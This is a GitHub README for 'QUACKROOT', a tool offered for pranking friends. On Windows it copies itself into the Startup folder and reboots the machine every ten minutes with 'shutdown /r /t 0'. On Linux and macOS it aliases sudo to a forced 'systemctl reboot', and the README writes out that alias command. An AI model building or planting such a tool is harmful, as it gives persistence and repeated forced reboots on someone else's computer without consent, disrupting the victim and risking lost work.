# QUACKROOT
A tool for Windows, macOS and Linux that will link sudo to reboot (macOS and Linux) and reboots every 10 minutes (Windows)
## How it works
The Windows version moves itself to the Startup folder and after login, reboots the system every 10 minutes using ```shutdown /r /t 0``` 

For Linux and macOS, it simply sets an alias for sudo as ```sudo systemctl reboot --force``` with 
```alias sudo="sudo systemctl reboot --force"```.
## Multiple languages
QUACKROOT comes in Python and Shell/Batch for all the different kinds of people.
#### Thanks for considering to use QUACKROOT to prank your friends!
## Credits
[@DCreator112-gh](https:?/github.com/dcreator112-gh) - Python Programmer and repo creator

[@Stormzady](https://github.com/stormzady) - Batch/Shell Programmer and the person who came up with the idea for this project!
